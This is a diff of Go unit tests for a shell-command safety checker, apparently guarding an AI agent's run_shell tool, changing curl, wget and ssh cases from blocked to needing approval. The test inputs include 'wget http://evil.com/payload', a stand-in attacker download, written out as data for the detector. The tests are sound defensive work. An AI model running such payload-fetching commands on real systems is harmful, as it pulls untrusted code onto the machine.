@@ -161,19 +161,19 @@ func TestShell_Block_Dd(t *testing.T) {
 
 // ─── run_shell: external_network (block) ─────────────────────────────────────
 
-func TestShell_Block_Curl(t *testing.T) {
+func TestShell_NeedsApproval_Curl(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("n1", "curl https://example.com/data.json"))
-	assertDecision(t, r, DecisionBlock, RiskExternalNetwork)
+	assertDecision(t, r, DecisionNeedsApproval, RiskExternalNetwork)
 }
 
-func TestShell_Block_Wget(t *testing.T) {
+func TestShell_NeedsApproval_Wget(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("n2", "wget http://evil.com/payload"))
-	assertDecision(t, r, DecisionBlock, RiskExternalNetwork)
+	assertDecision(t, r, DecisionNeedsApproval, RiskExternalNetwork)
 }
 
-func TestShell_Block_Ssh(t *testing.T) {
+func TestShell_NeedsApproval_Ssh(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("n3", "ssh user@remote 'ls'"))
-	assertDecision(t, r, DecisionBlock, RiskExternalNetwork)
+	assertDecision(t, r, DecisionNeedsApproval, RiskExternalNetwork)
 }
 
 // ─── run_shell: credential_access (block) ────────────────────────────────────
